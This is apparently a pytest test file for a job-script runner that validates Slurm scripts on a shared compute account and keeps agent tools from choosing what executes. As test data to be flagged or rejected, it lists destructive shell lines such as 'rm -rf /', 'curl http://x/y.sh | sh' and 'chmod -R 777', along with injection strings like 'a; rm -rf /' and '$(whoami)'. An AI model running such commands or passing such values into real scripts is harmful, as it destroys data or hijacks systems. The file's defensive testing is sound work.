"""
Tests for runner profiles (``aspen/runners.py``).

A runner is the job script Aspen fills in and submits. The properties that matter:

* **Registration is the review.** The bytes are copied into Aspen's storage and
  frozen, so the human's reading binds to content, not to a path whose contents can
  change afterwards.
* **Assignment is CLI-only**, like ``calc_root`` — nothing agent-facing selects
  what executes.
* **Placeholders are filled from typed values only.** Nothing from a conversation
  reaches the script.
* **Destructive commands are surfaced.** Not as a boundary — shell has unlimited
  spellings — but against the actor the threat model names: the member used to
  owning their compute account who is now sharing one.
* **Re-checked on use**, because the denied list can grow and the file lives on
  disk where it could be edited outside the CLI.
"""

import pytest

# The shape of a real job script in this group: a #SBATCH header, environment
# setup, one science invocation. Derived from Arun's actual Submission.sh.
SCRIPT = """\
#!/bin/bash
#SBATCH --account ssrl:SMBXAS
#SBATCH --partition=milano
#SBATCH --ntasks=[NTASKS]
#SBATCH --mem=[MEM_GB]G
#SBATCH --job-name=[JOB_NAME]
#SBATCH --time=[TIME]
#SBATCH --chdir=./

module purge
module load slurm
export PATH=/sdf/group/ssrl/sarangi/sw/orca504:$PATH

/sdf/group/ssrl/sarangi/sw/orca504/orca [INPUT] > [OUTPUT]
"""


@pytest.fixture
def registered(sut, env, tmp_path):
    env.register(
        {"slack_user_id": "U0SAM", "alias": "sam", "display_name": "Sam", "role": "admin"},
        {"slack_user_id": "U01ARUN", "alias": "arun", "display_name": "Arun N."},
    )
    script = tmp_path / "orca.sh"
    script.write_text(SCRIPT)
    profile = sut.runners.register("orca-nbo", script, description="single point + NBO",
                                   ntasks=32, mem_gb=256, time_limit="48:00:00")
    return {"env": env, "script": script, "profile": profile}


# --------------------------------------------------------------------------- #
# The script validator
# --------------------------------------------------------------------------- #
def test_a_realistic_script_passes(sut):
    assert sut.runners.script_problems(SCRIPT) == []


def test_sbatch_directives_are_not_mistaken_for_job_control(sut):
    """`#SBATCH` is the normal content of every job script.

    An earlier version of the pattern matched it case-insensitively and flagged
    every real script in the group. Caught by running the validator against Arun's
    actual file rather than a fixture, which is why this test exists.
    """
    assert sut.runners.script_problems(SCRIPT) == []
    assert "#SBATCH" in SCRIPT and "--account" in SCRIPT


def test_actual_job_control_is_still_caught(sut):
    for line in ("scancel 12345", "sbatch other.sh", "true && sbatch other.sh",
                 "qdel 99"):
        problems = sut.runners.script_problems(SCRIPT + "\n" + line + "\n")
        assert problems, f"{line!r} should be flagged"


@pytest.mark.parametrize("line,label", [
    ("rm -rf $HOME/scratch/*",              "rm"),
    ("find . -name '*.tmp' -delete",        "find -delete"),
    ("shred -u secrets.txt",                "shred"),
    ("rsync -a src/ dst/ --delete",         "rsync --delete"),
    ("chmod -R 777 /sdf/data",              "recursive chmod"),
    ("curl http://x/y.sh | sh",             "curl | sh"),
    ("sudo systemctl restart x",            "sudo"),
    ("echo hi > /sdf/home/t/tetef01/oops",  "absolute redirect"),
    ("mv results $HOME/keep",               "mv to home"),
])
def test_destructive_lines_are_surfaced(sut, line, label):
    """The accidental-cleanup case: habits from owning your own compute account."""
    problems = sut.runners.script_problems(SCRIPT + "\n" + line + "\n")
    assert problems, f"{label} should be surfaced"
    assert "shared account" in problems[0] or "absolute path" in problems[0]


def test_a_script_without_the_input_placeholder_is_refused(sut, tmp_path):
    """Otherwise Aspen has no way to tell the job which input to run."""
    script = tmp_path / "s.sh"
    script.write_text(SCRIPT.replace("[INPUT]", "hardcoded.inp"))
    with pytest.raises(sut.runners.RunnerError) as exc:
        sut.runners.register("no-input", script)
    assert "[INPUT]" in str(exc.value)


def test_an_unknown_placeholder_is_refused(sut, tmp_path):
    script = tmp_path / "s.sh"
    script.write_text(SCRIPT + "\necho [MADE_UP]\n")
    with pytest.raises(sut.runners.RunnerError) as exc:
        sut.runners.register("bogus", script)
    assert "MADE_UP" in str(exc.value)


def test_an_absolute_sbatch_output_path_is_refused(sut, tmp_path):
    script = tmp_path / "s.sh"
    script.write_text(SCRIPT.replace("#SBATCH --chdir=./",
                                     "#SBATCH --output=/sdf/home/someone/out.log"))
    with pytest.raises(sut.runners.RunnerError):
        sut.runners.register("abs", script)


def test_force_records_what_was_accepted(sut, env, tmp_path):
    """A legitimate scratch cleanup is common; the acceptance must be auditable."""
    env.default_group()
    script = tmp_path / "s.sh"
    script.write_text(SCRIPT + '\nrm -rf "$tdir"\n')
    with pytest.raises(sut.runners.RunnerError):
        sut.runners.register("scratchy", script)
    profile = sut.runners.register("scratchy", script, force=True)
    assert profile["problems_accepted"], "the override must be recorded, not silent"
    assert any("rm" in p for p in profile["problems_accepted"])


# --------------------------------------------------------------------------- #
# Registration freezes the reviewed bytes
# --------------------------------------------------------------------------- #
def test_registration_copies_the_script_into_aspens_storage(sut, registered):
    profile = registered["profile"]
    stored = sut.runners.Path(profile["script"])
    assert stored.is_file()
    assert stored.parent == sut.RUNNERS_DIR
    assert stored.read_text() == SCRIPT


def test_editing_the_source_afterwards_changes_nothing(sut, registered):
    """The review binds to bytes, not to a path whose contents can change."""
    registered["script"].write_text(SCRIPT + "\nrm -rf /\n")
    body = sut.runners.script_for(registered["profile"])
    assert "rm -rf /" not in body


def test_the_frozen_script_is_rechecked_on_use(sut, registered):
    """It lives on disk, where an operator could edit it outside the CLI."""
    stored = sut.runners.Path(registered["profile"]["script"])
    stored.write_text(SCRIPT + "\nsudo rm -rf /sdf/data\n")
    with pytest.raises(sut.runners.RunnerError) as exc:
        sut.runners.script_for(registered["profile"])
    assert "re-register" in str(exc.value)


def test_a_missing_script_is_an_error_not_an_empty_render(sut, registered):
    sut.runners.Path(registered["profile"]["script"]).unlink()
    with pytest.raises(sut.runners.RunnerError):
        sut.runners.script_for(registered["profile"])


# --------------------------------------------------------------------------- #
# Rendering: typed values only
# --------------------------------------------------------------------------- #
def test_rendering_fills_every_placeholder(sut, registered):
    import re
    out = sut.runners.render(registered["profile"], job_name="tddft-fe",
                             input_name="job.inp", output_name="job.out",
                             ntasks=8, mem_gb=32, time_limit="04:00:00")
    assert re.findall(r"\[[A-Z_]+\]", out) == []
    assert "--ntasks=8" in out and "--mem=32G" in out
    assert "orca job.inp > job.out" in out


@pytest.mark.parametrize("bad", [
    "a; rm -rf /", "a b", "../escape", "-flag", "$(whoami)", "`id`", "a|b", "",
    ".", "..",
])
def test_filenames_and_job_names_reject_anything_shell_shaped(sut, registered, bad):
    with pytest.raises(sut.runners.RunnerError):
        sut.runners.render(registered["profile"], job_name=bad, input_name="j.inp",
                           output_name="j.out")
    with pytest.raises(sut.runners.RunnerError):
        sut.runners.render(registered["profile"], job_name="ok", input_name=bad,
                           output_name="j.out")


def test_resources_are_bounded(sut, registered):
    for kwargs in ({"ntasks": 100000}, {"mem_gb": 99999}, {"ntasks": 0},
                   {"time_limit": "999:00:00"}, {"time_limit": "not-a-time"},
                   {"ntasks": "lots"}):
        with pytest.raises(sut.runners.RunnerError):
            sut.runners.render(registered["profile"], job_name="ok",
                               input_name="j.inp", output_name="j.out", **kwargs)


def test_defaults_apply_when_nothing_is_supplied(sut, registered):
    out = sut.runners.render(registered["profile"], job_name="ok",
                             input_name="j.inp", output_name="j.out")
    assert "--ntasks=32" in out and "--mem=256G" in out


# --------------------------------------------------------------------------- #
# Assignment
# --------------------------------------------------------------------------- #
def test_assignment_comes_from_the_registry(sut, registered):
    env = registered["env"]
    env.register(
        {"slack_user_id": "U0SAM", "alias": "sam", "display_name": "Sam", "role": "admin"},
        {"slack_user_id": "U01ARUN", "alias": "arun", "display_name": "Arun N.",
         "job_runner": "orca-nbo"},
    )
    assert sut.runners.for_user("U01ARUN")["name"] == "orca-nbo"
    assert sut.runners.for_user("U0SAM") is None, "no runner means no submission"


def test_an_assignment_to_an_unregistered_runner_resolves_to_nothing(sut, registered):
    """Fail closed: a dangling name must not fall back to some other runner."""
    registered["env"].register(
        {"slack_user_id": "U01ARUN", "alias": "arun", "display_name": "Arun N.",
         "job_runner": "was-deleted"},
    )
    assert sut.runners.for_user("U01ARUN") is None


def test_nothing_in_the_agents_reach_assigns_a_runner(sut):
    """Which script executes is chosen by an operator, never by a conversation."""
    for spec in sut.TOOL_SPECS:
        props = set(spec["input_schema"].get("properties", {}))
        for forbidden in ("runner", "job_runner", "script", "script_path"):
            assert forbidden not in props, (
                f"{spec['name']} must not accept {forbidden!r} — that would let the "
                "model choose what executes"
            )


# --------------------------------------------------------------------------- #
# Registry hygiene
# --------------------------------------------------------------------------- #
def test_bad_runner_names_are_refused(sut, env, tmp_path):
    env.default_group()
    script = tmp_path / "s.sh"
    script.write_text(SCRIPT)
    for bad in ("Has Space", "UPPER-ok?", "../x", "", "dots.here"):
        with pytest.raises(sut.runners.RunnerError):
            sut.runners.register(bad, script)


def test_an_unsupported_code_is_refused(sut, env, tmp_path):
    env.default_group()
    script = tmp_path / "s.sh"
    script.write_text(SCRIPT)
    with pytest.raises(sut.runners.RunnerError) as exc:
        sut.runners.register("g16", script, code="gaussian")
    assert "validator" in str(exc.value)


def test_a_corrupt_runner_registry_reads_as_empty_not_as_a_crash(sut, env):
    env.default_group()
    sut.RUNNERS_FILE.parent.mkdir(parents=True, exist_ok=True)
    sut.RUNNERS_FILE.write_text("{not json")
    assert sut.runners.load() == {}


def test_replacing_a_runner_needs_force(sut, registered, tmp_path):
    other = tmp_path / "other.sh"
    other.write_text(SCRIPT)
    with pytest.raises(sut.runners.RunnerError) as exc:
        sut.runners.register("orca-nbo", other)
    assert "already exists" in str(exc.value)
    assert sut.runners.register("orca-nbo", other, force=True)
